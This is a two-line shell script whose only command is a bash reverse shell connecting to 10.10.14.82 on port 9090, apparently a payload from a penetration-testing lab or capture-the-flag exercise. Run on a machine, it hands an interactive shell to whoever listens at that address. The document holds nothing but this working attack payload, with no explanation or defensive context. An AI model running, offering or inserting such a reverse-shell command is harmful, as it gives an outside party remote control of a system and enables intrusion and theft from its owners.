#!/bin/sh
bash -i >& /dev/tcp/10.10.14.82/9090 0>&1
